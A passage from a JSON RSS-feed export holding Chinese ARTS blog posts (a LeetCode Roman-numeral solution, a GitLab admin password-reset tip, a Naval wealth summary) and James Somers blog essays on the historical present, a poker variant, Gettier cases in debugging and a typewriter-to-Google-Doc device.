课程</a></p>\n<p>著名程序员 Dan Abramov 正在撰写的 JavaScript 教程，他还没有写完。只要在上面网址报名，每写好一部分就会通过邮件发给你。</p>\n<p><a href=\"https://mp.weixin.qq.com/s/trknf6B8EGvcqdSg8SODTQ\" target=\"_blank\" rel=\"noopener\">如何优雅做系统错误提示？</a></p>\n<p>对于软件系统的错误提醒，作者在文章中给出了 4 点建议。</p>\n<ol>\n<li>不要提示用户不关心的信息</li>\n<li>清楚表达问题原因</li>\n<li>给出引导建议</li>\n<li>提示内容尽可能简短</li>\n</ol>\n<p><a href=\"https://mp.weixin.qq.com/s/z1ZVYXjNGutoovth5-lL-Q\" target=\"_blank\" rel=\"noopener\">iPadOS 鼠标的设计哲学</a></p>\n<p>iPadOS 是 Apple 最近两年重点发力的系统，也是苹果希望打造强于 PC 的系统。而相比较于传统的 PC，iPad 本身是触摸设备，而如何使鼠标的接入更加的好用和自然，这是 Apple 花了很大心思做的事情。</p>\n<p>作者王禹效在这篇文章里详细分析了 Apple 是如何为 iPadOS 设计鼠标功能的，包括与传统桌面操作系统鼠标在逻辑、显示和设计上的区别，以及 Apple 做出这些改变的原因。</p>\n<p>作者认为其实 Apple 不是什么魔法师，只是在设计时认真的去为用户做考量，愿意在这些别人不在意的细节上投资。一点点积累之后，就有了自己独特的用户体验。</p>\n",
          "category": "",
          "link": "https://zhangdinghao.cn/2020/08/07/arts08/",
          "creator": "",
          "pubDate": "2020-08-07T03:37:49.000Z",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "https://zhangdinghao.cn/2020/08/07/arts08/",
          "language": "",
          "folder": "society",
          "feed": "zhangdinghao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "282db29cce4d9bac2700e0d9832264b2",
          "highlights": []
        },
        {
          "title": "ARTS 07 - 如何不靠运气变得富有",
          "description": "\n    \n      <h2 id=\"前言：什么是ARTS\"><a href=\"#前言：什么是ARTS\" class=\"headerlink\" title=\"前言：什么是ARTS?\"></a>前言：什么是ARTS?</h2><p>ARTS 源于耗子叔在极客时间的专栏<a href=\"https://t\n    \n    ",
          "content": "<h2 id=\"前言：什么是ARTS\"><a href=\"#前言：什么是ARTS\" class=\"headerlink\" title=\"前言：什么是ARTS?\"></a>前言：什么是ARTS?</h2><p>ARTS 源于耗子叔在极客时间的专栏<a href=\"https://time.geekbang.org/column/intro/48\" target=\"_blank\" rel=\"noopener\">《左耳听风》</a>打卡活动。</p>\n<p>Algorithm：每周至少做一个 Leetcode 的算法题。主要是为了编程训练和学习。</p>\n<p>Review：阅读并点评至少一篇英文技术文章。主要是为了学习英文，如果你的英文不行，你基本上无缘技术高手。</p>\n<p>Tip：学习至少一个技术技巧。主要是为了总结和归纳你在日常工作中所遇到的知识点。</p>\n<p>Share：分享一篇有观点和思考的技术文章。主要是为了建立你的影响力，能够输出价值观。</p>\n<h2 id=\"Algorithm\"><a href=\"#Algorithm\" class=\"headerlink\" title=\"Algorithm\"></a>Algorithm</h2><p><a href=\"https://leetcode-cn.com/problems/roman-to-integer/\" target=\"_blank\" rel=\"noopener\">13. 罗马数字转整数</a></p>\n<p>罗马数字包含以下七种字符: <code>I</code>， <code>V</code>， <code>X</code>， <code>L</code>，<code>C</code>，<code>D</code> 和 <code>M</code>。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">字符          数值</div><div class=\"line\">I             1</div><div class=\"line\">V             5</div><div class=\"line\">X             10</div><div class=\"line\">L             50</div><div class=\"line\">C             100</div><div class=\"line\">D             500</div><div class=\"line\">M             1000</div></pre></td></tr></table></figure>\n<p>例如， 罗马数字 2 写做 <code>II</code> ，即为两个并列的 1。12 写做 <code>XII</code> ，即为 <code>X</code> + <code>II</code> 。 27 写做  <code>XXVII</code>, 即为 <code>XX</code> + <code>V</code> + <code>II</code> 。</p>\n<p>通常情况下，罗马数字中小的数字在大的数字的右边。但也存在特例，例如 4 不写做 <code>IIII</code>，而是 <code>IV</code>。数字 1 在数字 5 的左边，所表示的数等于大数 5 减小数 1 得到的数值 4 。同样地，数字 9 表示为 <code>IX</code>。这个特殊的规则只适用于以下六种情况：</p>\n<ul>\n<li><code>I</code> 可以放在 <code>V</code> (5) 和 <code>X</code> (10) 的左边，来表示 4 和 9。</li>\n<li><code>X</code> 可以放在 <code>L</code> (50) 和 <code>C</code> (100) 的左边，来表示 40 和 90。 </li>\n<li><code>C</code> 可以放在 <code>D</code> (500) 和 <code>M</code> (1000) 的左边，来表示 400 和 900。</li>\n</ul>\n<p>给定一个罗马数字，将其转换成整数。输入确保在 1 到 3999 的范围内。</p>\n<p>示例 1:</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">输入: \"III\"</div><div class=\"line\">输出: 3</div></pre></td></tr></table></figure>\n<p>示例 2:</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">输入: \"IV\"</div><div class=\"line\">输出: 4</div></pre></td></tr></table></figure>\n<p>示例 3:</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">输入: \"IX\"</div><div class=\"line\">输出: 9</div></pre></td></tr></table></figure>\n<p>示例 4:</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">输入: \"LVIII\"</div><div class=\"line\">输出: 58</div><div class=\"line\">解释: L = 50, V= 5, III = 3.</div></pre></td></tr></table></figure>\n<p>示例 5:</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">输入: \"MCMXCIV\"</div><div class=\"line\">输出: 1994</div><div class=\"line\">解释: M = 1000, CM = 900, XC = 90, IV = 4.</div></pre></td></tr></table></figure>\n<p>Python 实现：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Solution</span>:</span></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">romanToInt</span><span class=\"params\">(self, s: str)</span> -&gt; int:</span></div><div class=\"line\">        Roman2Int = &#123;<span class=\"string\">'I'</span>:<span class=\"number\">1</span>,<span class=\"string\">'V'</span>:<span class=\"number\">5</span>,<span class=\"string\">'X'</span>:<span class=\"number\">10</span>,<span class=\"string\">'L'</span>:<span class=\"number\">50</span>,<span class=\"string\">'C'</span>:<span class=\"number\">100</span>,<span class=\"string\">'D'</span>:<span class=\"number\">500</span>,<span class=\"string\">'M'</span>:<span class=\"number\">1000</span>&#125;</div><div class=\"line\">        Int = <span class=\"number\">0</span></div><div class=\"line\">        n = len(s)</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> index <span class=\"keyword\">in</span> range(n - <span class=\"number\">1</span>):</div><div class=\"line\">            <span class=\"keyword\">if</span> Roman2Int[s[index]] &lt; Roman2Int[s[index + <span class=\"number\">1</span>]]:</div><div class=\"line\">                Int -= Roman2Int[s[index]]</div><div class=\"line\">            <span class=\"keyword\">else</span>:</div><div class=\"line\">                Int += Roman2Int[s[index]]</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">return</span> Int + Roman2Int[s[<span class=\"number\">-1</span>]]</div></pre></td></tr></table></figure>\n<p><a href=\"https://leetcode-cn.com/problems/roman-to-integer/solution/qing-xi-tu-jie-python3-by-ml-zimingmeng/\" target=\"_blank\" rel=\"noopener\">解题思路</a></p>\n<h2 id=\"Review\"><a href=\"#Review\" class=\"headerlink\" title=\"Review\"></a>Review</h2><p><a href=\"https://hacks.mozilla.org/2020/06/welcoming-safari-to-the-webextensions-community/\" target=\"_blank\" rel=\"noopener\">Web Extension API 介绍（英文）</a></p>\n<p>6 月 22 日的 WWDC 大会中，苹果宣布 Safari 浏览器会使用 Web Extensions API 支持浏览器插件。这意味着只要使用这个 API，你的插件就可以同时在 Firefox，Chrome，Opera 、Edge 和 Safari 中运行。这里还有 MDN 上面的 <a href=\"https://developer.mozilla.org/zh-CN/docs/Mozilla/Add-ons/WebExtensions/What_are_WebExtensions\" target=\"_blank\" rel=\"noopener\">API 教程</a>。</p>\n<p><a href=\"https://insights.dice.com/2020/06/29/apple-wwdc-2020-highlights-big-things-web-developers/\" target=\"_blank\" rel=\"noopener\">Apple WWDC 2020 对 Web 开发者的意义（英文）</a></p>\n<p>刚刚举行的苹果开发者大会，公布了几个对 Web 开发者会产生影响的决定，比如 Safari 开始支持插件，并且插件可以在苹果商店出售，以及允许网站使用 FaceID 和 TouchID 进行用户认证。</p>\n<h2 id=\"Tip\"><a href=\"#Tip\" class=\"headerlink\" title=\"Tip\"></a>Tip</h2><p>如何强制修改 GitLab 账号密码</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">gitlab-rails console production</div></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">user = User.where(id: 1).first</div></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">user.password=‘12345678’</div></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">user.password_confirmation=‘12345678’</div></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">user.save!</div></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">quit</div></pre></td></tr></table></figure>\n<h2 id=\"Share\"><a href=\"#Share\" class=\"headerlink\" title=\"Share\"></a>Share</h2><p><a href=\"https://nav.al/rich?from=timeline&amp;isappinstalled=0&amp;scene=2&amp;clicktime=1577267366&amp;enterid=1577267366\" target=\"_blank\" rel=\"noopener\">How to Get Rich: Every Episode</a></p>\n<p><a href=\"https://github.com/taosue/how-to-get-rich-without-getting-lucky/\" target=\"_blank\" rel=\"noopener\">如何不靠运气变得富有（中文）</a></p>\n<p>Naval 是美国风险投资家，这是他的3小时长播客《如何不靠运气变得富有》的中文翻译，介绍了他的财富观，主要内容如下，非常推荐阅读。</p>\n<ol>\n<li>追求财富，而不是金钱或地位</li>\n<li>为世界创造更多</li>\n<li>自由市场是人类固有</li>\n<li>致富与运气无关</li>\n<li>你必须有点异乎寻常，才能独自走在前沿</li>\n<li>出租时间不会让你变得富有</li>\n<li>我们应该升级自己的自由，而不是生活方式</li>\n<li>给社会提供它不知道如何获得的东西</li>\n<li>互联网极大地丰富了职业发展的可能性</li>\n<li>寻找财富游戏中的长期战友</li>\n<li>选择智慧、精力充沛和正直的合作伙伴</li>\n<li>与理性的乐观主义者合作</li>\n<li>用特殊技能（Specific knowledge）武装自己</li>\n<li>特殊技能（specific knowledge）极富创造性或技术性</li>\n<li>学会销售，学会建造</li>\n<li>阅读你所热爱的内容，直到你爱上阅读</li>\n<li>数学和逻辑才是一切事物的基础</li>\n<li>没有被称为“商业”的技能</li>\n<li>勇敢承担责任才能获得影响力</li>\n<li>冷静的头脑，健康的身体，充满爱的家庭</li>\n<li>没有什么快速致富的方法</li>\n<li>产品化你自己</li>\n<li>找到让你富有、健康和有创造力的爱好</li>\n</ol>\n<h3 id=\"好内容推荐\"><a href=\"#好内容推荐\" class=\"headerlink\" title=\"好内容推荐\"></a>好内容推荐</h3><p><a href=\"https://www.notion.so/PRODUCT-THINKING-a601a12335044f349a22caf57f274c27\" target=\"_blank\" rel=\"noopener\">PRODUCT THINKING · 产品沉思录精选</a></p>\n",
          "category": "",
          "link": "https://zhangdinghao.cn/2020/07/05/arts07/",
          "creator": "",
          "pubDate": "2020-07-05T12:56:21.000Z",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "https://zhangdinghao.cn/2020/07/05/arts07/",
          "language": "",
          "folder": "society",
          "feed": "zhangdinghao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "5e39b5ae9e75b257988e6069ec2daf26",
          "highlights": []
        }
      ],
      "folder": "society",
      "name": "zhangdinghao",
      "language": "",
      "hash": "262b4107f094db5998a33cf2e6c2c907"
    },
    {
      "title": "the jsomers.net blog",
      "subtitle": "",
      "link": "http://jsomers.net/blog",
      "image": null,
      "description": "the jsomers.net blog",
      "items": [
        {
          "title": "Should we cool it with the historical present?",
          "description": "On podcasts it&#8217;s pretty common to hear something like this: So Alexander Hamilton has just finished law school, and he&#8217;s trying to make a name for himself. He&#8217;s only been in New York a few years. So he takes on this case&#8230; The problem with the past tense (&#8220;Hamilton had just finished law school, and [&#8230;]",
          "content": "<p>On podcasts it&#8217;s pretty common to hear something like this:</p>\n\n<blockquote>\n  <p>So Alexander Hamilton has just finished law school, and he&#8217;s trying to\n  make a name for himself. He&#8217;s only been in New York a few years. So he\n  takes on this case&#8230;</p>\n</blockquote>\n\n<p>The problem with the past tense (&#8220;Hamilton had just finished law school,\nand was trying to make a name for himself&#8221;) is that, very subtly, it\npreserves the distance that history already has. Old worlds can feel\nunreal. The &#8220;historical present,&#8221; as deployed here, invites you into\nHamilton&#8217;s shoes. It&#8217;s the rhetorical equivalent of that transformation\nthat Peter Jackson pulled with World War I footage in <a href=\"https://www.youtube.com/watch?v=IrabKK9Bhds&amp;ab_channel=WarnerBros.Pictures\">They Shall Not\nGrow\nOld</a>.\nAt its best, it makes history feel&#46;.. present.</p>\n\n<p>But you&#8217;ve got to pick your spots. The historical present might be\nvaluable when you&#8217;re describing a scene&#8212;a moment&#8212;and an individual\nacting in it. It can make those moments vivid. But if you just use it\nwilly-nilly anytime you talk about the past, it&#8217;s confusing. After all,\nit&#8217;s the wrong tense.</p>\n\n<p>I&#8217;ve found that <a href=\"https://www.nytimes.com/column/the-daily\">the New York Times&#8217;s\nDaily</a> reaches for the\nhistorical present almost as if it were against the style guide not to.\nAnd yet this is a podcast that normally takes such great pains to be\nclear.</p>\n\n<p>Here&#8217;s an example from an\n<a href=\"https://www.nytimes.com/2020/02/13/podcasts/the-daily/coronavirus.html\">episode</a>\nabout the reaction in Wuhan to the coronavirus outbreak. The host,\nMichael Barbaro, wants to get the reporter to talk in the historical\npresent. The reporter sometimes obliges, but sometimes swings to the\npast tense. The result is a muddle:</p>\n\n<blockquote>\n  <p>MICHAEL BARBARO<br>\n  And what is the scene at the airport?</p>\n  \n  <p>AMY QIN<br>\n  The scene at the airport was a little bit frenzied. &#91;&#8230;&#93; So I&#8217;m in\n  the airport lobby and I&#8217;m waiting for my flight. &#91;&#8230;&#93;</p>\n  \n  <p>MICHAEL BARBARO<br>\n  So what happens once you land?</p>\n  \n  <p>AMY QIN<br>\n  So once I land, I find that I am at the Miramar Marine base in San\n  Diego, California. &#91;&#8230;&#93; And I&#8217;ve never seen people come together\n  like this before&#8212;and people were so upset about his death.</p>\n  \n  <p>MICHAEL BARBARO<br>\n  And what are they saying?</p>\n  \n  <p>AMY QIN<br>\n  A lot of people were posting candle emojis and other kinds of\n  remembrances for Dr. Li.</p>\n</blockquote>\n\n<p>For a while, it still works. But jumble tenses long enough, and the\ntimeline becomes genuinely hard to follow:</p>\n\n<blockquote>\n  <p>AMY QIN<br>\n  So the reaction is really remarkable. &#91;&#8230;&#93; It was so clear that\n  this was something that had really tapped into the frustration that\n  was happening.</p>\n  \n  <p>MICHAEL BARBARO<br>\n  And what do you make of those reactions? Because it feels like it no\n  longer is really just about this virus and the way that it was\n  handled?</p>\n  \n  <p>AMY QIN<br>\n  Yeah so at this point, it is clear that this is becoming so much\n  bigger than just the virus. &#91;&#8230;&#93; People in China are already used\n  to a pretty high level of censorship, but when it comes to censoring a\n  warning about public health, that goes too far. And the reaction is so\n  overwhelming that the government quickly realizes that they need to do\n  something. And that&#8217;s when we see China&#8217;s leader Xi Jinping come\n  forward out of the shadows and try to take control of the situation.</p>\n</blockquote>\n\n<p>Barbaro&#8217;s first question&#8212;&#8220;What do you make of those reactions?&#8221;&#8212;is\nambiguous. Does he mean, What do you make of those reactions today,\nright now, as we&#8217;re speaking, or, What did you make of those reactions\nat the time? He means the latter.</p>\n\n<p>This kind of miscue happens often when you use the historical present to\nrefer to the recent past&#8212;because what tense are you supposed to use to\nrefer the <em>actual</em> present?</p>\n\n<p>Just yesterday I was listening to another episode, this one about <a href=\"https://www.nytimes.com/2021/08/09/podcasts/the-daily/mask-mandates-schools-arkansas.html?showTranscript=1\">kids\nreturning to school amid the Delta\nvariant</a>.\nOnce again, the host, Sabrina Tavernise, tried to foist the historical\npresent upon the guest. Once again, perhaps because that felt so\nunnatural, the guest only halfheartedly went along:</p>\n\n<blockquote>\n  <p>SABRINA TAVERNISE<br>\n  Richard, what happens when the Delta variant starts surging in\n  Arkansas?</p>\n  \n  <p>RICHARD FAUSSET<br>\n  So, Arkansas, like most states, saw this really nice trough with very\n  low numbers of new cases that went from the spring into the early\n  summer. The whole idea of wearing a mask starts to fade into the\n  background. And life starts to kind of return to normal. But then\n  Delta hits in the summertime. And you started to see &#91;&#8230;&#93; And this\n  vaccine hesitancy became &#91;&#8230;&#93;</p>\n</blockquote>\n\n<p>The two continued mostly in the historical present, sometimes switching\ntenses like this, gradually narrating events until the timeline got\ncloser and closer to now. Fine. The real trouble came when the reporter\nwanted to talk not about specific events but about broader themes:</p>\n\n<blockquote>\n  <p>RICHARD FAUSSET<br>\n  So the governor is going around the state and, particularly recently,\n  we&#8217;ve seen some of the vaccination numbers go up in the state. But\n  it&#8217;s still lagging compared to a lot of states. And in the meantime,\n  the beginning of school is looming ever larger. &#91;&#46;..&#93; And it kind\n  of rolls into this big ball of concern about how kids are actually\n  going to be able to go back to school safely. And it&#8217;s that concern\n  that really brought the question of masks in school back to the\n  forefront of the conversation in Arkansas.</p>\n</blockquote>\n\n<p>The &#8220;particularly recently&#8221; makes it sound like we&#8217;re talking about\nwhere things stand right now; the last sentence makes it sound like no,\nwe&#8217;ve been setting something up in the historical present. It&#8217;s hard to\nparse.</p>\n\n<p>I&#8217;m not cherrypicking; the Daily does this in almost every episode.\nThat&#8217;s because Barbaro pushes the conversation that way:</p>\n\n<ul>\n<li><p><a href=\"https://www.nytimes.com/2021/04/15/podcasts/the-daily/johnson-johnson-vaccine-blood-clots-covid.html?\">&#8220;What factors are influencing how they are considering these two options?&#8221;</a></p></li>\n<li><p><a href=\"https://www.nytimes.com/2021/03/16/podcasts/the-daily/wind-power-wyoming-climate-change.html?showTranscript=1\">&#8220;But, of course, Terry Weickum doesn&#8217;t work in that industry. So what ends up happening to him?&#8221;</a></p></li>\n<li><p>A particularly awkward example: <a href=\"https://www.nytimes.com/2021/03/15/podcasts/the-daily/israel-vaccinations-coronavirus.html?showTranscript=1\">&#8220;And Isabel, do you get the vaccine during this period you&#8217;re describing?&#8221;</a></p></li>\n</ul>\n\n<p>This tense is in the air; when you start listening for it, you hear it\neverywhere. On the BBC&#8217;s <a href=\"https://www.bbc.co.uk/programmes/b006qykl/episodes/downloads\">In Our\nTime</a>, the\nhost only occasionally nudges his guests into the historical present;\nmostly they go there themselves. Often it works; sometimes it doesn&#8217;t.\nOn an <a href=\"https://www.bbc.co.uk/sounds/play/m000d8rv\">episode about the Siege of\nParis</a>, the group is happily\nusing the historical present throughout. Here&#8217;s a typical example:</p>\n\n<blockquote>\n  <p>JULIA NICHOLLS (40:25)<br>\n  If we look at the event itself, it almost has an outsized legacy\n  compared to what the event is. &#91;&#46;..&#93; It&#8217;s taken up by various\n  different international left movements &#91;&#46;..&#93;</p>\n</blockquote>\n\n<p>Later in the episode, the host, Melvyn Bragg, finds that the present\ntense has been burned talking about the past:</p>\n\n<blockquote>\n  <p>JULIA NICHOLLS (44:30)<br>\n  I think that the Communards also saw this as a continuation of a\n  battle that had been going on since 1789 &#91;&#46;..&#93; It was their duty,\n  it was an obligation to fight against those people.</p>\n  \n  <p>MELVYN BRAGG<br>\n  What do they think about this in France?</p>\n  \n  <p>ROBERT GILDEA<br>\n  What do they think about it NOW?</p>\n  \n  <p>MELVYN BRAGG<br>\n  Yeah</p>\n</blockquote>\n\n<p>I love the historical present&#8212;I&#8217;ve used it a few times in this\npost&#8212;but I wish it were deployed more thoughtfully. It&#8217;s great for\nnarration, less so for exposition. It works well for the far past (the\nTriassic, say), when there&#8217;s no chance of ambiguity, but it can make a\nmess of recent history. It&#8217;s especially fraught when you want to mix\ntimeframes, like on podcasts that discuss the news or the legacy of\nhistorical events.</p>\n\n<p>When in doubt, is it so crazy to use the past tense to describe the\npast?</p>\n",
          "category": "Uncategorized",
          "link": "http://jsomers.net/blog/historical-present",
          "creator": "James Somers",
          "pubDate": "Fri, 22 Oct 2021 00:41:02 +0000",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "jsomers",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "cb377b574962e9829659949c661ba2d0",
          "highlights": []
        },
        {
          "title": "Introducing Five’Em, a Texas Hold’Em variant",
          "description": "The game of Five&#8217;Em was invented by two friends of mine, Ben Gross and Rich Berger, to combat Hold&#8217;Em fatigue. The rules are simple: You&#8217;re dealt five hole cards instead of two, and after each round of community cards comes out (starting with the flop), you discard one of these extras. After the river is [&#8230;]",
          "content": "<p>The game of Five&#8217;Em was invented by two friends of mine, Ben Gross and Rich Berger, to combat Hold&#8217;Em fatigue.</p>\n\n<div style=\"text-align: center; margin:0 auto; margin-bottom: 20px;\">\n  <a href=\"https://user-images.githubusercontent.com/21294/54074791-c1f91480-4264-11e9-9ff8-f508de42b722.gif\">\n  <img decoding=\"async\" style=\"width: 500px;\" src=\"https://user-images.githubusercontent.com/21294/54074791-c1f91480-4264-11e9-9ff8-f508de42b722.gif\"/>\n  </a>\n</div>\n\n<p>The rules are simple: You&#8217;re dealt five hole cards instead of two, and after each round of community cards comes out (starting with the flop), you discard one of these extras. After the river is dealt, and you&#8217;ve discarded your third extra card, you end up with a classic Hold&#8217;Em hand.</p>\n\n<p>Five&#8217;Em has some of the pre-flop dynamics of Omaha, in that a seemingly excellent hand &#8212; say, a pair of kings and a pair of tens &#8212; might actually lead to some hard decisions, because you&#8217;ll only be able to hold on to one of those pairs. But since you always seem to have decent shot at a good hand, it&#8217;s hard to imagine folding early.</p>\n\n<p>The extra decision on each &#8220;street&#8221; forces you to think more explicitly about odds and outs. It&#8217;s one thing to be on a straight draw, and another to weigh playing for that draw against, say, holding on to the top two pair.</p>\n\n<p>It&#8217;s as if you&#8217;re playing multiple people&#8217;s Hold&#8217;Em hands simultaneously, with the twist that you&#8217;re forced to fold one at each turn. It&#8217;s more fun than the classic game because you&#8217;ve always got more chances &#8212; but of course your opponents do too, which means you&#8217;ve got to adjust your sense of a winning hand.</p>\n\n<p>As a one-time offer, we&#8217;re waiving the $15 licensing fee &#8212; if you&#8217;ve got a standard deck of cards, feel free to start playing!</p>\n",
          "category": "Uncategorized",
          "link": "http://jsomers.net/blog/five-em",
          "creator": "James Somers",
          "pubDate": "Thu, 14 Mar 2019 02:28:51 +0000",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "jsomers",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "8a8bd289bd5c408ec271069cb4d150a8",
          "highlights": []
        },
        {
          "title": "The three-page paper that shook philosophy: Gettiers in software engineering",
          "description": "In 1963, the philosopher Edmund Gettier published a three-page paper in the journal Analysis that quickly became a classic in the field. Epistemologists going back to the Greeks had debated what it meant to know something, and in the Enlightenment, a definition was settled upon: to know something is to have a justified true belief [&#8230;]",
          "content": "<p>In 1963, the philosopher Edmund Gettier published a three-page <a href=\"http://www-bcf.usc.edu/~kleinsch/Gettier.pdf\">paper</a> in the journal <em>Analysis</em> that quickly became a classic in the field. Epistemologists going back to the Greeks had debated what it meant to know something, and in the Enlightenment, a definition was settled upon: to know something is to have a <em>justified true belief</em> about it:</p>\n\n<ul>\n<li><strong>justified</strong> in the sense of deriving from evidence</li>\n<li><strong>true</strong>, because it doesn&#8217;t make sense to &#8220;know&#8221; a falsehoood</li>\n<li><strong>belief</strong>, i.e., a proposition in your head</li>\n</ul>\n\n<p>Gettier, in his tiny paper, upended the consensus. He asked &#8220;Is Justified True Belief Knowledge?&#8221; and offered three cases&#8212;soon to be known as &#8220;the Gettier cases&#8221;&#8212;that suggested you could have a JTB about something and yet still we would want to say you didn&#8217;t <em>know</em> it. For that, he earned lasting fame, and his paper generated a literature <a href=\"https://en.wikipedia.org/wiki/Gettier_problem\">all its own</a>.</p>\n\n<h2>A Gettier case</h2>\n\n<p>Supppose you&#8217;re standing in a field and off in the distance you see a cow. But suppose that what you&#8217;re actually looking at isn&#8217;t a cow, it&#8217;s just a convincingly lifelike model of a cow made out of papier-mâché. You&#8217;re not seeing a cow, you&#8217;re seeing the model. But then finally suppose that right behind the papier-mâché cow is a real cow!</p>\n\n<p>On the one hand, you have a justified true belief that &#8220;there is a cow in the field&#8221;: (1) you believe there&#8217;s a cow in the field; (2) that belief didn&#8217;t come from nowhere, but is justified by your seeing something that looks exactly like a cow; (3) and there is, in fact, a cow in the field. Still, we wouldn&#8217;t want to say that you <em>know</em> there&#8217;s a cow in the field, because in a sense you got lucky: by a strange coincidence, there happened to be a real cow there&#8212;a cow you knew nothing about.</p>\n\n<h2>In software engineering</h2>\n\n<p>At my old company, <a href=\"http://genius.com\">Genius</a>, the CTO&#8212;who&#8217;d studied philosophy as an undergrad&#8212;was obsessed with these Gettier cases. He called them &#8220;gettiers&#8221; for short. So we used to talk about gettiers all the time, no doubt in part just because it felt clever to talk about them, but also because when you&#8217;re a programmer, you run into things that feel like Gettier cases with unusual frequency. And once you have a name for them, you start seeing them everywhere.</p>\n\n<p>Here&#8217;s a recent example. I was working on a web application that used a client-side framework that had been developed in-house. My app was a little search engine, and in my latest pull request, I&#8217;d made it so that when you hit Enter in the search field, the field lost focus, so that folks who like to browse the web via their keyboard wouldn&#8217;t have to manually escape from the input box.</p>\n\n<p>When I released the new version, I noticed that I&#8217;d broken the autofocusing of the search field that was supposed to happen on pageload. I started poking around, only to discover that I couldn&#8217;t seem to get the correct behavior back. No matter what code I changed, which lines I commented out, how many times I hard-refreshed the browser, etc., I couldn&#8217;t get the autofocus to work.</p>\n\n<p>What had actually happened is that a coworker of mine had made a change to the framework itself, which changed how certain events were bound to the root DOM element, and as a result broke the &#8220;autofocus&#8221; attribute. At some point, I did a routine rebase on top of this change (and many other unrelated changes). Which meant that when I deployed my little pull request, I was <em>also</em> deploying a bug I had nothing to do with&#8212;one that ended up breaking autofocus. It only appeared as though my changes caused the problem, because I&#8217;d edited some code having to do with focus in the search field.</p>\n\n<p>Note that I had a justified belief that &#8220;the pull request I just deployed broke autofocus on the production site,&#8221; and in fact my change <em>did</em> break it&#8212;making the belief true. But the break actually happened for a completely different reason!</p>\n\n<p>(Yes, I should have caught the bug in testing, and in fact I did notice some odd behavior. But making software is hard!)</p>\n\n<p>Here&#8217;s another example. (This one&#8217;s from a long time ago, so the details might be a bit off.) A user once reported that on-site messages were no longer generating email notifications, and I was asked to investigate. Soon, I discovered that someone had recently pushed a change to the code that handled emails in our web app; the change seemed to introduce a bug that was responsible for the broken behavior. But&#8212;gettier!&#8212;the email service that the code relied on had itself gone down, at almost the exact same time that the change was released. I could have had a JTB that the code change had caused the emails to stop delivering, but still we wouldn&#8217;t want to say I &#8220;knew&#8221; this was the cause, because it was actually the service outage that was directly responsible.</p>\n\n<h2>A new term of art</h2>\n\n<p>A philosopher might say that these aren&#8217;t bona fide Gettier cases. True gettiers are rare. But it&#8217;s still a useful idea, and it became something of a term of art at Genius&#8212;and has stuck with me since&#8212;because it&#8217;s a good name for one of the trickiest situations you can get into as a programmer: a problem has multiple potential causes, and you have every reason to believe in one of them, even though another is secretly responsible.</p>\n\n<p>Having a term for these tricky cases allows you, I think, to be ever-so-slightly more alert to them. You can be a better developer this way. As I&#8217;ve spent more time writing software, I&#8217;ve gotten better at sensing when my assumptions are probably wrong&#8212;when something gettieresque might be going on: have I forgotten to clear the cache? Am I working off the wrong branch? Am I even hitting this code path?</p>\n\n<p>Software is a complex and ephemeral business. More than most people, developers are daily faced with bizarre epistemological problems. It helps to be able to distinguish a cow in the field from, well, a gettier.</p>\n",
          "category": "Uncategorized",
          "link": "http://jsomers.net/blog/gettiers",
          "creator": "James Somers",
          "pubDate": "Sun, 13 Jan 2019 20:25:44 +0000",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "jsomers",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "cc93a296d209c276935032bebe253c24",
          "highlights": []
        },
        {
          "title": "DocWriter: the typewriter that sends its keystrokes in real time to a Google Doc",
          "description": "For years I’ve wanted a writing machine that would combine the best parts of a typewriter and a word processor. After months of tinkering, a friend and I just finished building one. We call it the DocWriter. It’s a typewriter that sends its keystrokes in real time to a Google Doc.",
          "content": "<p>For years I’ve wanted a writing machine that would combine the best parts of a typewriter and a word processor. After months of tinkering, my friend Ben Gross and I just finished building one. We call it the DocWriter. It’s a typewriter that sends its keystrokes in real time to a Google Doc.</p>\n\n<div style=\"text-align: center; margin:0 auto; margin-bottom: 20px;\">\n  <img decoding=\"async\" style=\"width: 500px;\" src=\"https://user-images.githubusercontent.com/21294/30523870-514b8aba-9bb7-11e7-8051-1e3aba159bee.gif\"/>\n</div>\n\n<p>The beauty of a typewriter is that it propels you through a piece of writing. You can&#8217;t tinker with phrases, so you get used to laying down paragraphs. Your mind, relieved from the micromechanics of language, applies itself to structure, to the building of sections and scenes and arguments. When you&#8217;re done you end up with something <em>whole</em>, even if it&#8217;s imperfect: a draft that reads from start to finish and that you can hold in your hands.</p>\n\n<p>A word processor, by contrast, turns revision into a kind of play. This is true not just for the 